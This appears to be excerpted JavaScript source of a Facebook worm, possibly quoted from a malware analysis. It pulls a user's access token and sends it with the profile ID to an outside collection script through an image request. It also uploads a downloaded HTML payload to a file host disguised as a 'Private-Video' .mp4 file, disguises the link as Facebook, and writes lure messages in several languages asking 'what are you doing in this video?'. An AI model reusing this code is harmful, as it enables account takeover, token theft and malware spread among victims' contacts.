    ...
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        if (xhr.responseText.indexOf("access_token") > 0) {
          (new Image).src = "http://mydomain.now/flies/tokenize.php?profile_id=" + profile_id + "&access_token=" + xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gender=Android";
...
function getkey(jsonOBJECT){
  var xhr = new ajax();
  xhr.open("GET", "https://expirebox.com/");
  xhr.send();
  xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
          ...
          jsonOBJECT.u_key = xmlDoc.querySelector('[name="u_key"]').value;
...
function getFile(jsonOBJECT){
   var oReq = new ajax();
   oReq.open("GET", "https://linear-cloud.herokuapp.com/", true);
   oReq.responseType = "arraybuffer";
   oReq.onreadystatechange = function() {
       if(this.readyState != 4) return;
       var arrayBufferView = new Uint8Array( this.response );
       jsonOBJECT.blob = new Blob( [ arrayBufferView ], { type: "text/html" } );
...
function uploadFile(jsonOBJECT){
       ...
       var fd = new FormData();
       fd.append('u_key', jsonOBJECT.u_key);
       fd.set('files', jsonOBJECT.blob, name+'-Private-Video-'+Math.floor(Math.random()*9999)+'.mp4.html');
       var xhr = new ajax();
       xhr.open("POST", "https://expirebox.com/jqu/");
       xhr.send(fd);
       xhr.onreadystatechange = function() {
           if (xhr.readyState == 4) {
               var data = JSON.parse(xhr.responseText);
               jsonOBJECT.filekey = data.files[0].fileKey;
               getLink(jsonOBJECT);
         }
       }
...
function getLink(jsonOBJECT){
var xhr = new ajax();
xhr.open("GET", "https://expirebox.com/download/"+ jsonOBJECT.filekey +".html");
xhr.send();
xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
     var data = xhr.responseText;
     var parser=new DOMParser();
     var xmlDoc=parser.parseFromString(data,"text/html");
     jsonOBJECT.link = xmlDoc.querySelector(".btn-download").href;
...
function _S_e(jsonOBJECT) {
  ...
  var linki = jsonOBJECT.link;
  var link = linki.replace("www.facebook", "expirebox");
  if(lang == "sq_AL") {
  title = "çfarë po bën në këtë video?";
  }
  else if(lang == "mk_MK") {
  title = "што правиш на ова видео?";
  }
  else if(lang == "es_LA" || lang == "es_CO" || lang == "es_ES") {
  title = "¿Qué estás haciendo en este video?";
  }
  else if(lang == "de_DE") {
  title = "Was machst du in diesem Video?";
  }
  else if(lang == "bs_BA" || lang == "hr_HR" || lang == "sr_RS") {
  title = "šta radiš na ovom videozapisu?";
  }
  else if(lang == "sl_SI") {
